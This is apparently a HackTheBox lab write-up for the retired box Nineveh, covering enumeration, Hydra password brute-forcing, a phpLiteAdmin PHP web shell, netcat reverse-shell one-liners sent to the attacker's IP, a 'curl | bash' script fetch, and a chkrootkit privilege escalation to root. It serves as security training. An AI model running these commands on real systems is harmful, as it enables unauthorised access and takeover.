# Nineveh

This is the write-up for the box Nineveh that got retired at the 16th December 2017.
My IP address was 10.10.14.15 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.43    nineveh.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/nineveh.nmap 10.10.10.43
```

```markdown
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
```

The SSL certificate exposes the hostname _nineveh.htb_ and a potential username _admin@nineveh.htb_.

## Checking HTTP (Port 80)

On the web page there is a default "It works!" Apache page with no additional information.
Lets look for hidden paths with **Gobuster**:
```markdown
gobuster -u http://10.10.10.43/ dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It outputs _/department_ path which forwards to _/department/login.php_ with a login form.

![Department login page](https://kyuu-ji.github.io/htb-write-up/nineveh/nineveh_http-1.png)

Lets try to brute-force the credentials with **Hydra**:
```markdown
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
```

After finishing, it found the password for the user _admin_:
> 1q2w3e4r5t

When login in with the credentials, the web page shows an _"Under Construction!"_ image.
The menu _Notes_ shows the following information:
```markdown
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois
```

The potential username _amrois_ is disclosed. When looking at the URL of the _Notes_ menu, it looks like a file path:
```markdown
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt
```

After playing around with it, it becomes clear that this page looks for the string _ninevehNotes_ and everything without _.txt_ results in a PHP error, which means we need to create a PHP file somehow to get code execution.

## Checking HTTPS (Port 443)

On the HTTPS web page there is an image with no additional information.
Lets look for hidden paths with **Gobuster**:
```markdown
gobuster -u https://10.10.10.43/ dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

It outputs _/db_ path which wants a password for **phpLiteAdmin v1.9** and _/secure_notes_ path which displays an image without additional information.

![phpLiteAdmin login page](https://kyuu-ji.github.io/htb-write-up/nineveh/nineveh_https-1.png)

Lets try to brute-force the credentials with **Hydra**:
```markdown
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect" -t 64
```

After finishing, it found a valid password:
> password123

### Exploiting the database

Lets look for vulnerabilities in **phpLiteAdmin**:
```markdown
searchsploit phpliteadmin
```

The result called _PHPLiteAdmin 1.9.3 - Remote PHP Code Injection_ is a vulnerability that allows to put PHP code in a database, rename that database with a PHP extension and then execute the code.

Create new database called _ninevehNotes_:

![phpLiteAdmin create database](https://kyuu-ji.github.io/htb-write-up/nineveh/nineveh_https-2.png)

Create table with PHP command:
```markdown
<?php echo system($\_REQUEST["cmd"]); ?>
```

![phpLiteAdmin create table](https://kyuu-ji.github.io/htb-write-up/nineveh/nineveh_https-3.png)

Rename the database so it has a PHP extension:

![phpLiteAdmin rename database](https://kyuu-ji.github.io/htb-write-up/nineveh/nineveh_https-4.png)

Now we can browse back to the HTTP page to replace _ninevehNotes.txt_ to _ninevehNotes.php_ and try to execute a `whoami` command.
```markdown
http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=whoami
```

This works and displays the username _www-data_ which means we got code execution.
Now lets start a reverse shell:
```markdown
/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.15+9001+>/tmp/f
```

After sending this request, the listener on my IP and port 9001 starts a session on the box as _www-data_.

## Privilege Escalation

To get an attack surface on the box we execute any **Linux Enumeration script**.
```markdown
curl 10.10.14.15 /LinEnum.sh| bash
```

Analyzing the output, the following information is interesting:
- Localhost listens on port 22 (SSH)
- Root path has a non-default folder called _/report_ that belongs to the user _amrois_

### Privilege Escalation to user

The path _/secure_notes_ on the web page with the _nineveh.png_ image is there for a reason.
When downloading it and analyzing it with `binwalk` it turns out that a **gzip** file is hidden inside of it. Lets extract everything out of the image:
```markdown
binwalk -Me nineveh.png
```

In the extracted tar file, there is a **RSA Public key (nineveh.pub)** and a **RSA Private key (nineveh.priv)**.
The public key is for the user _amrois_ so lets try to SSH into the box:
```markdown
chmod 600 nineveh.priv

ssh -i nineveh.priv amrois@nineveh.htb
```

It returns nothing because port 22 is closed as the initial scan showed us, but on the local enumeration it showed that SSH listens on localhost.
Looking at the services, there is a service called **knockd** that is a **Port Knocking** service.
The configuration file for this is in _/etc/knockd.conf_ that looks like this:
```markdown
[options]
 logfile = /var/log/knockd.log
 interface = ens33

[openSSH]
 sequence = 571, 290, 911
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

It tells us, that knocking on port 571, 290, 911 allows access to port 22. A port knock works by sending a TCP packet to the ports.
```markdown
for i in 571 290 911; do nmap -Pn -p $i --host-timeout 201 --max-retries 0 10.10.10.43; done
```

Now checking for port 22 on the box with Nmap, it displays that it is open:
```markdown
nmap -p 22 10.10.10.43
```

```markdown
PORT   STATE SERVICE
22/tcp open  ssh
```

Access to SSH with the private key works now and we get in as _amrois_:
```markdown
ssh -i nineveh.priv amrois@10.10.10.43
```

### Privilege Escalation to root

In the _/report_ path there are several .txt reports that are created with one minute difference which means there is a probably a cronjob running that is doing this.

Lets look at the processes with **Pspy**:
```markdown
wget http://10.10.14.15/pspy

chmod +x pspy

./pspy
```

Every minute the box runs the `/usr/bin/chkrootkit` program.
The reports found in the _/report_ folder hold the content of the **chkrootkit** program.

When looking for vulnerabilities in this program, there is a **Privilege Escalation** for this tool:
```markdown
searchsploit chkrootkit

# Output
Chkrootkit 0.49 - Local Privilege Escalation
```

For this vulnerability it is required to create _/tmp/update_ so **chkrootkit** automatically executes it.
The file will include the code to return a reverse shell:
```markdown
rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.15 9002 >/tmp/g
```

After a minute, the listener on my IP and port 9002 starts a reverse shell as root!
